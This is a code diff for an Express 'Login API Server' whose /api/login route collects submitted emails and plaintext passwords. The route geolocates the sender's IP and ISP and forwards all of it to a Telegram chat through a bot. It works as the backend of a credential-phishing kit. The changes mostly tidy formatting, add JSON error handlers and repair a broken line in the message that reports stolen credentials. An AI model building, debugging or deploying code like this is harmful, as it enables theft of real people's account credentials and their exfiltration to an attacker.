@@ -14,18 +14,28 @@ app.use(express.json({ limit: '256kb' }));
 app.use(express.urlencoded({ extended: true, limit: '256kb' }));
 app.set('trust proxy', true);
 
+/* ==========================================================================
+ * Rate limiter — returns JSON on 429 so the frontend never chokes
+ * ======================================================================== */
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 100,
   standardHeaders: true,
   legacyHeaders: false,
-  keyGenerator: (req) => req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress
+  keyGenerator: (req) =>
+    req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
+  handler: (req, res) => {
+    res.status(429).json({
+      success: false,
+      message: 'Too many requests. Please try again in a few minutes.'
+    });
+  }
 });
 app.use('/api', limiter);
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_API_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 /* ==========================================================================
  * Helpers
@@ -55,7 +65,10 @@ function formatTimestamp(date) {
 
 function esc(v) {
   if (v === null || v === undefined) return 'N/A';
-  return String(v).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  return String(v)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
 }
 
 function trunc(v, max = 120) {
@@ -87,15 +100,24 @@ async function sendToTelegram(message, opts = {}) {
       console.error('[telegram] API error:', JSON.stringify(err.response.data));
     }
 
-    // If HTML failed, retry once as plain text (strip HTML tags crudely)
+    /* If HTML failed, retry once as plain text */
     if (parseMode === 'HTML') {
-      const stripped = message.replace(/<[^>]+>/g, '').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
+      const stripped = message
+        .replace(/<[^>]+>/g, '')
+        .replace(/&lt;/g, '<')
+        .replace(/&gt;/g, '>')
+        .replace(/&amp;/g, '&');
+
       try {
-        const res2 = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
-          chat_id: TELEGRAM_CHAT_ID,
-          text: stripped,
-          disable_web_page_preview: true
-        }, { timeout: 10000 });
+        const res2 = await axios.post(
+          `${TELEGRAM_API_URL}/sendMessage`,
+          {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: stripped,
+            disable_web_page_preview: true
+          },
+          { timeout: 10000 }
+        );
         console.log('[telegram] retried as plain text — OK');
         return { success: true, data: res2.data, retried: true };
       } catch (err2) {
@@ -108,16 +130,24 @@ async function sendToTelegram(message, opts = {}) {
 
 async function getIPLocation(ip) {
   try {
-    if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('::ffff:')) {
+    if (
+      !ip ||
+      ip === 'Unknown' ||
+      ip.includes('127.0.0.1') ||
+      ip.includes('::1') ||
+      ip.includes('::ffff:')
+    ) {
       return 'Local/Private Network';
     }
+
     const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 5000 });
+
     if (response.data && response.data.status === 'success') {
       const parts = [];
-      if (response.data.city) parts.push(response.data.city);
+      if (response.data.city)       parts.push(response.data.city);
       if (response.data.regionName) parts.push(response.data.regionName);
-      if (response.data.country) parts.push(response.data.country);
-      if (response.data.isp) parts.push(`ISP: ${response.data.isp}`);
+      if (response.data.country)    parts.push(response.data.country);
+      if (response.data.isp)        parts.push(`ISP: ${response.data.isp}`);
       return parts.join(', ') || 'Unknown';
     }
     return 'Unknown';
@@ -138,7 +168,7 @@ function formatLoginMessage(loginData) {
     '━━━━━━━━━━━━━━━━━━━━',
     `📅 <b>Date/Time:</b> ${esc(formatTimestamp(now))}`,
     `🌍 <b>UTC Time:</b> ${esc(now.toISOString())}`,
-)}    `📧 <b>Email:</b> ${esc(loginData.email`,
+    `📧 <b>Email:</b> ${esc(loginData.email)}`,
     `🔑 <b>Password:</b> ${esc(loginData.password)}`,
     `🌐 <b>IP Address:</b> ${esc(loginData.ip)}`,
     `📍 <b>Location:</b> ${esc(loginData.location)}`,
@@ -156,7 +186,7 @@ app.post('/api/login', async (req, res) => {
     const body = req.body || {};
     const { email, password } = body;
 
-    // ── LOUD LOGGING ───────────────────────────────────────────────────
+    /* ── LOUD LOGGING ─────────────────────────────────────────────── */
     console.log('========== NEW LOGIN ==========');
     console.log('Body keys:', Object.keys(body));
     console.log('Has email:', !!email, '| Has password:', !!password);
@@ -169,13 +199,12 @@ app.post('/api/login', async (req, res) => {
       return res.status(400).json({ success: false, message: 'Password is required' });
     }
 
-    const clientIP = getClientIP(req);
+    const clientIP  = getClientIP(req);
     const userAgent = req.headers['user-agent'];
-    const location = await getIPLocation(clientIP);
+    const location  = await getIPLocation(clientIP);
 
     const loginData = { email, password, ip: clientIP, location, userAgent };
-
-    const loginMsg = formatLoginMessage(loginData);
+    const loginMsg  = formatLoginMessage(loginData);
 
     console.log('[telegram] sending login message…');
     const r1 = await sendToTelegram(loginMsg);
@@ -212,8 +241,13 @@ app.get('/health', (req, res) => {
 });
 
 app.get('/api/test-telegram', async (req, res) => {
-  const testMessage = `✅ Test message\n🕐 Local: ${formatTimestamp(new Date())}\n🌍 UTC: ${new Date().toISOString()}`;
+  const testMessage =
+    `✅ Test message\n` +
+    `🕐 Local: ${formatTimestamp(new Date())}\n` +
+    `🌍 UTC: ${new Date().toISOString()}`;
+
   const result = await sendToTelegram(testMessage);
+
   res.status(result.success ? 200 : 500).json({
     success: result.success,
     message: result.success ? 'Test sent' : 'Failed',
@@ -226,10 +260,10 @@ app.get('/api/debug-ip', (req, res) => {
     detectedIP: getClientIP(req),
     timestamp: formatTimestamp(new Date()),
     headers: {
-      'x-forwarded-for': req.headers['x-forwarded-for'],
-      'x-real-ip': req.headers['x-real-ip'],
+      'x-forwarded-for':  req.headers['x-forwarded-for'],
+      'x-real-ip':        req.headers['x-real-ip'],
       'cf-connecting-ip': req.headers['cf-connecting-ip'],
-      'true-client-ip': req.headers['true-client-ip']
+      'true-client-ip':   req.headers['true-client-ip']
     }
   });
 });
@@ -239,16 +273,34 @@ app.get('/', (req, res) => {
     message: 'Login API Server',
     status: 'Running',
     endpoints: {
-      login: 'POST /api/login',
-      health: 'GET /health',
-      testTelegram: 'GET /api/test-telegram',
-      debugIP: 'GET /api/debug-ip'
+      login:         'POST /api/login',
+      health:        'GET /health',
+      testTelegram:  'GET /api/test-telegram',
+      debugIP:       'GET /api/debug-ip'
     }
   });
 });
 
-app.use((req, res) => res.status(404).json({ success: false, message: 'Route not found' }));
+/* 404 — always JSON so the frontend can parse it */
+app.use((req, res) =>
+  res.status(404).json({ success: false, message: 'Route not found' })
+);
 
+/* ==========================================================================
+ * Global error handler — catches anything Express would render as HTML
+ * MUST be placed after all routes and before app.listen
+ * ======================================================================== */
+app.use((err, req, res, next) => {
+  console.error('[unhandled]', err);
+  res.status(err.status || 500).json({
+    success: false,
+    message: err.message || 'Internal server error'
+  });
+});
+
+/* ==========================================================================
+ * Start
+ * ======================================================================== */
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📱 Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
